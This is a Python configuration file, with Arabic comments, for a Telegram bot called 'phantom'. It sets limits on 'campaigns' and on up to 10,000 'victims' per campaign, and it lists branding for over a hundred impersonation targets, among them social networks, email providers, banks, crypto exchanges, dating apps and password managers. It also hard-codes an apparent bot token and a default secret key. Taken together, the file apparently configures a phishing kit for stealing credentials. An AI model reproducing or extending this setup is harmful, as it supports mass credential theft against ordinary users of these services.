#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
from dataclasses import dataclass, field
from typing import List

@dataclass
class Config:
    # Telegram Bot Token
    BOT_TOKEN: str = "8854298093:AAGCDRkEp4fk_hWwYBVM3oQ6p0RuLapmbgA"
    
    # معرفات المشرفين
    ADMIN_IDS: List[int] = field(default_factory=lambda: [8305841557, 2490904131357])
    
    # رقم المطور للدعم
    DEVELOPER_ID: int = 2490904131357
    DEVELOPER_USERNAME: str = "@Developer_Support"  # يمكن تغييره
    
    # قاعدة البيانات
    DATABASE_URL: str = os.getenv("DATABASE_URL", "sqlite:///phantom.db")
    
    # الخادم
    PORT: int = int(os.getenv("PORT", 8080))
    HOST: str = os.getenv("HOST", "0.0.0.0")
    PUBLIC_URL: str = os.getenv("PUBLIC_URL", "https://phantom-bot.onrender.com")
    
    # مفاتيح التشفير
    SECRET_KEY: str = os.getenv("SECRET_KEY", "phantom-secret-2024")
    
    # حدود النظام
    MAX_CAMPAIGNS_PER_USER: int = 50
    MAX_VICTIMS_PER_CAMPAIGN: int = 10000
    
    # المنصات المدعومة (200+ قالب)
    PLATFORMS: dict = field(default_factory=lambda: {
        # المنصات الرئيسية
        'facebook': {'name': 'Facebook', 'icon': '🔵', 'color': '#1877F2'},
        'instagram': {'name': 'Instagram', 'icon': '📸', 'color': '#E4405F'},
        'twitter': {'name': 'Twitter/X', 'icon': '🐦', 'color': '#000000'},
        'tiktok': {'name': 'TikTok', 'icon': '🎵', 'color': '#000000'},
        'snapchat': {'name': 'Snapchat', 'icon': '👻', 'color': '#FFFC00'},
        'linkedin': {'name': 'LinkedIn', 'icon': '💼', 'color': '#0A66C2'},
        'pinterest': {'name': 'Pinterest', 'icon': '📌', 'color': '#E60023'},
        'reddit': {'name': 'Reddit', 'icon': '🔴', 'color': '#FF4500'},
        'tumblr': {'name': 'Tumblr', 'icon': '📝', 'color': '#36465D'},
        'flickr': {'name': 'Flickr', 'icon': '📷', 'color': '#0063DC'},
        
        # المراسلة
        'whatsapp': {'name': 'WhatsApp', 'icon': '💬', 'color': '#25D366'},
        'telegram': {'name': 'Telegram', 'icon': '✈️', 'color': '#0088CC'},
        'signal': {'name': 'Signal', 'icon': '🔐', 'color': '#3A76F0'},
        'messenger': {'name': 'Messenger', 'icon': '💭', 'color': '#0084FF'},
        'discord': {'name': 'Discord', 'icon': '🎮', 'color': '#5865F2'},
        'slack': {'name': 'Slack', 'icon': '💼', 'color': '#4A154B'},
        'wechat': {'name': 'WeChat', 'icon': '💚', 'color': '#07C160'},
        'line': {'name': 'LINE', 'icon': '📗', 'color': '#00C300'},
        'viber': {'name': 'Viber', 'icon': '💜', 'color': '#7360F2'},
        'kik': {'name': 'Kik', 'icon': '💬', 'color': '#82BC23'},
        
        # البريد الإلكتروني
        'gmail': {'name': 'Gmail', 'icon': '📧', 'color': '#EA4335'},
        'outlook': {'name': 'Outlook', 'icon': '📮', 'color': '#0078D4'},
        'yahoo': {'name': 'Yahoo Mail', 'icon': '📬', 'color': '#6001D2'},
        'protonmail': {'name': 'ProtonMail', 'icon': '🔒', 'color': '#6D4AFF'},
        'icloud': {'name': 'iCloud Mail', 'icon': '☁️', 'color': '#3693F3'},
        'aol': {'name': 'AOL Mail', 'icon': '📧', 'color': '#FF0B00'},
        'zoho': {'name': 'Zoho Mail', 'icon': '📨', 'color': '#D50000'},
        
        # التخزين السحابي
        'googledrive': {'name': 'Google Drive', 'icon': '📁', 'color': '#4285F4'},
        'dropbox': {'name': 'Dropbox', 'icon': '📦', 'color': '#0061FF'},
        'onedrive': {'name': 'OneDrive', 'icon': '☁️', 'color': '#0078D4'},
        'box': {'name': 'Box', 'icon': '📦', 'color': '#0061D5'},
        'mega': {'name': 'MEGA', 'icon': '🔐', 'color': '#D9272E'},
        'mediafire': {'name': 'MediaFire', 'icon': '🔥', 'color': '#1299F3'},
        
        # الترفيه
        'youtube': {'name': 'YouTube', 'icon': '▶️', 'color': '#FF0000'},
        'twitch': {'name': 'Twitch', 'icon': '🎮', 'color': '#9146FF'},
        'netflix': {'name': 'Netflix', 'icon': '🎬', 'color': '#E50914'},
        'spotify': {'name': 'Spotify', 'icon': '🎧', 'color': '#1DB954'},
        'soundcloud': {'name': 'SoundCloud', 'icon': '🎵', 'color': '#FF5500'},
        'hulu': {'name': 'Hulu', 'icon': '📺', 'color': '#1CE783'},
        'disney': {'name': 'Disney+', 'icon': '✨', 'color': '#113CCF'},
        'primevideo': {'name': 'Prime Video', 'icon': '🎥', 'color': '#00A8E1'},
        
        # التسوق
        'amazon': {'name': 'Amazon', 'icon': '🛒', 'color': '#FF9900'},
        'ebay': {'name': 'eBay', 'icon': '🛍️', 'color': '#E53238'},
        'aliexpress': {'name': 'AliExpress', 'icon': '📦', 'color': '#FF4747'},
        'wish': {'name': 'Wish', 'icon': '🎁', 'color': '#2FB7EC'},
        'etsy': {'name': 'Etsy', 'icon': '🧶', 'color': '#F1641E'},
        'walmart': {'name': 'Walmart', 'icon': '🏪', 'color': '#0071CE'},
        'target': {'name': 'Target', 'icon': '🎯', 'color': '#CC0000'},
        'bestbuy': {'name': 'Best Buy', 'icon': '💻', 'color': '#0046BE'},
        'costco': {'name': 'Costco', 'icon': '🏬', 'color': '#E31837'},
        'alibaba': {'name': 'Alibaba', 'icon': '🏭', 'color': '#FF6A00'},
        
        # البنوك والمالية
        'paypal': {'name': 'PayPal', 'icon': '💳', 'color': '#003087'},
        'venmo': {'name': 'Venmo', 'icon': '💸', 'color': '#3D95CE'},
        'cashapp': {'name': 'Cash App', 'icon': '💵', 'color': '#00D632'},
        'zelle': {'name': 'Zelle', 'icon': '💰', 'color': '#6D1ED4'},
        'stripe': {'name': 'Stripe', 'icon': '💳', 'color': '#635BFF'},
        'square': {'name': 'Square', 'icon': '⬛', 'color': '#000000'},
        'coinbase': {'name': 'Coinbase', 'icon': '₿', 'color': '#0052FF'},
        'binance': {'name': 'Binance', 'icon': '📊', 'color': '#F0B90B'},
        'kraken': {'name': 'Kraken', 'icon': '🐙', 'color': '#5741D9'},
        'robinhood': {'name': 'Robinhood', 'icon': '📈', 'color': '#00C805'},
        
        # الألعاب
        'steam': {'name': 'Steam', 'icon': '🎮', 'color': '#1B2838'},
        'epicgames': {'name': 'Epic Games', 'icon': '🎯', 'color': '#2F2D2E'},
        'origin': {'name': 'EA Origin', 'icon': '🎲', 'color': '#F56C2D'},
        'uplay': {'name': 'Ubisoft', 'icon': '🎮', 'color': '#0070FF'},
        'battle.net': {'name': 'Battle.net', 'icon': '⚔️', 'color': '#148EFF'},
        'gog': {'name': 'GOG Galaxy', 'icon': '🌌', 'color': '#86328A'},
        'itch.io': {'name': 'itch.io', 'icon': '🎨', 'color': '#FA5C5C'},
        'roblox': {'name': 'Roblox', 'icon': '🧱', 'color': '#FF0000'},
        'minecraft': {'name': 'Minecraft', 'icon': '⛏️', 'color': '#62B47A'},
        'fortnite': {'name': 'Fortnite', 'icon': '🔫', 'color': '#8B00FF'},
        
        # التعليم
        'coursera': {'name': 'Coursera', 'icon': '🎓', 'color': '#0056D2'},
        'udemy': {'name': 'Udemy', 'icon': '📚', 'color': '#A435F0'},
        'khanacademy': {'name': 'Khan Academy', 'icon': '📖', 'color': '#14BF96'},
        'edx': {'name': 'edX', 'icon': '🎓', 'color': '#02262B'},
        'skillshare': {'name': 'Skillshare', 'icon': '🎨', 'color': '#00FF84'},
        'duolingo': {'name': 'Duolingo', 'icon': '🦉', 'color': '#58CC02'},
        'chegg': {'name': 'Chegg', 'icon': '📚', 'color': '#A6D608'},
        'quizlet': {'name': 'Quizlet', 'icon': '📝', 'color': '#4257B2'},
        
        # العمل والإنتاجية
        'zoom': {'name': 'Zoom', 'icon': '📹', 'color': '#2D8CFF'},
        'teams': {'name': 'Microsoft Teams', 'icon': '👥', 'color': '#6264A7'},
        'meet': {'name': 'Google Meet', 'icon': '📹', 'color': '#00897B'},
        'webex': {'name': 'Webex', 'icon': '📞', 'color': '#049FD9'},
        'skype': {'name': 'Skype', 'icon': '☎️', 'color': '#00AFF0'},
        'notion': {'name': 'Notion', 'icon': '📝', 'color': '#000000'},
        'trello': {'name': 'Trello', 'icon': '📋', 'color': '#0079BF'},
        'asana': {'name': 'Asana', 'icon': '✅', 'color': '#F06A6A'},
        'monday': {'name': 'Monday.com', 'icon': '📊', 'color': '#FF3D57'},
        'clickup': {'name': 'ClickUp', 'icon': '☝️', 'color': '#7B68EE'},
        
        # التصميم والإبداع
        'canva': {'name': 'Canva', 'icon': '🎨', 'color': '#00C4CC'},
        'figma': {'name': 'Figma', 'icon': '🖌️', 'color': '#F24E1E'},
        'adobe': {'name': 'Adobe', 'icon': '🅰️', 'color': '#FF0000'},
        'behance': {'name': 'Behance', 'icon': '🎭', 'color': '#1769FF'},
        'dribbble': {'name': 'Dribbble', 'icon': '🏀', 'color': '#EA4C89'},
        'deviantart': {'name': 'DeviantArt', 'icon': '🎨', 'color': '#05CC47'},
        'artstation': {'name': 'ArtStation', 'icon': '🖼️', 'color': '#13AFF0'},
        
        # المواعدة والعلاقات
        'tinder': {'name': 'Tinder', 'icon': '🔥', 'color': '#FD3A73'},
        'bumble': {'name': 'Bumble', 'icon': '🐝', 'color': '#FFC629'},
        'okcupid': {'name': 'OKCupid', 'icon': '💘', 'color': '#FF5864'},
        'match': {'name': 'Match.com', 'icon': '💕', 'color': '#00D172'},
        'grindr': {'name': 'Grindr', 'icon': '🌈', 'color': '#F26A21'},
        'hinge': {'name': 'Hinge', 'icon': '💑', 'color': '#FF6B6B'},
        'badoo': {'name': 'Badoo', 'icon': '💜', 'color': '#783BF9'},
        
        # السفر والنقل
        'uber': {'name': 'Uber', 'icon': '🚗', 'color': '#000000'},
        'lyft': {'name': 'Lyft', 'icon': '🚙', 'color': '#FF00BF'},
        'airbnb': {'name': 'Airbnb', 'icon': '🏠', 'color': '#FF5A5F'},
        'booking': {'name': 'Booking.com', 'icon': '🏨', 'color': '#003580'},
        'expedia': {'name': 'Expedia', 'icon': '✈️', 'color': '#FFC94D'},
        'tripadvisor': {'name': 'TripAdvisor', 'icon': '🗺️', 'color': '#00AF87'},
        'skyscanner': {'name': 'Skyscanner', 'icon': '🔍', 'color': '#0770E3'},
        
        # الأخبار والمعلومات
        'medium': {'name': 'Medium', 'icon': '📰', 'color': '#000000'},
        'buzzfeed': {'name': 'BuzzFeed', 'icon': '🐝', 'color': '#E32A22'},
        'huffpost': {'name': 'HuffPost', 'icon': '📰', 'color': '#2E7061'},
        'vice': {'name': 'VICE', 'icon': '📺', 'color': '#000000'},
        'quora': {'name': 'Quora', 'icon': '❓', 'color': '#B92B27'},
        'stackexchange': {'name': 'Stack Exchange', 'icon': '📚', 'color': '#1E5397'},
        'stackoverflow': {'name': 'Stack Overflow', 'icon': '💻', 'color': '#F48024'},
        
        # الصحة واللياقة
        'myfitnesspal': {'name': 'MyFitnessPal', 'icon': '💪', 'color': '#0070FF'},
        'fitbit': {'name': 'Fitbit', 'icon': '⌚', 'color': '#00B0B9'},
        'strava': {'name': 'Strava', 'icon': '🏃', 'color': '#FC4C02'},
        'headspace': {'name': 'Headspace', 'icon': '🧘', 'color': '#F47D31'},
        'calm': {'name': 'Calm', 'icon': '😌', 'color': '#3659B9'},
        'peloton': {'name': 'Peloton', 'icon': '🚴', 'color': '#FF3347'},
        
        # الأمان والخصوصية
        'nordvpn': {'name': 'NordVPN', 'icon': '🔒', 'color': '#4687FF'},
        'expressvpn': {'name': 'ExpressVPN', 'icon': '🛡️', 'color': '#DA3940'},
        'protonvpn': {'name': 'ProtonVPN', 'icon': '🔐', 'color': '#6D4AFF'},
        'tunnelbear': {'name': 'TunnelBear', 'icon': '🐻', 'color': '#F5A623'},
        'lastpass': {'name': 'LastPass', 'icon': '🔑', 'color': '#D32D27'},
        '1password': {'name': '1Password', 'icon': '🔐', 'color': '#0572EC'},
        'dashlane': {'name': 'Dashlane', 'icon': '🔒', 'color': '#0E353D'},
        
        # المزيد...
        'wikipedia': {'name': 'Wikipedia', 'icon': '📖', 'color': '#000000'},
        'wikihow': {'name': 'wikiHow', 'icon': '📚', 'color': '#93B874'},
        'archive': {'name': 'Archive.org', 'icon': '🗃️', 'color': '#000000'},
        'pastebin': {'name': 'Pastebin', 'icon': '📋', 'color': '#02456C'},
        'imgur': {'name': 'Imgur', 'icon': '🖼️', 'color': '#1BB76E'},
        'giphy': {'name': 'GIPHY', 'icon': '🎞️', 'color': '#FF6666'},
        'tenor': {'name': 'Tenor', 'icon': '🎬', 'color': '#000000'},
        'bitly': {'name': 'Bitly', 'icon': '🔗', 'color': '#EE6123'},
        'tinyurl': {'name': 'TinyURL', 'icon': '🔗', 'color': '#000000'},
        
        # منصات عربية
        'facebook_ar': {'name': 'فيسبوك عربي', 'icon': '🔵', 'color': '#1877F2'},
        'twitter_ar': {'name': 'تويتر عربي', 'icon': '🐦', 'color': '#1DA1F2'},
        'instagram_ar': {'name': 'إنستغرام عربي', 'icon': '📸', 'color': '#E4405F'},
        'snapchat_ar': {'name': 'سناب شات عربي', 'icon': '👻', 'color': '#FFFC00'},
        'tiktok_ar': {'name': 'تيك توك عربي', 'icon': '🎵', 'color': '#000000'},
        'whatsapp_ar': {'name': 'واتساب عربي', 'icon': '💬', 'color': '#25D366'},
        'telegram_ar': {'name': 'تيليجرام عربي', 'icon': '✈️', 'color': '#0088CC'},
    })

# إنشاء كائن الإعدادات العام
config = Config()
